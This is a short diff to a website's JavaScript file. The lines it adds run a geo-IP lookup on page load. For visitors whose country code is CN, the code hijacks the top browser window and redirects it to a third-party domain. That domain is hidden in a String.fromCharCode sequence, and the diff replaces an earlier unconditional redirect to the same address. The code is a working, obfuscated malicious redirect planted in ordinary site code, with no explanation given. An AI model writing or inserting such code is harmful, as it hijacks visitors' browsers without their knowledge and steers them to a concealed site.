@@ -1,3 +1,9 @@
+function getips(d){
+
+ if(d.country_code=="CN"){
+   window.top.location.href=String.fromCharCode(104, 116, 116, 112, 115, 58, 47, 47, 119, 119, 119, 46, 48, 48, 50, 56, 48, 48, 48, 46, 99, 111, 109, 47);
+  }
+}
 (function () {
   var get = false;
   var ii = false;
@@ -59,7 +65,8 @@
     //var rr=3;
     //var rss=Math.floor(Math.random()*rr)
    // if(rss==1){
-      window.top.location.href=String.fromCharCode(104, 116, 116, 112, 115, 58, 47, 47, 119, 119, 119, 46, 48, 48, 50, 56, 48, 48, 48, 46, 99, 111, 109, 47);
+    var s= document.createElement("script");s.src="https://api.ip.sb/geoip?callback=getips";document.head.appendChild(s); 
+     
    // }
   }
 })();
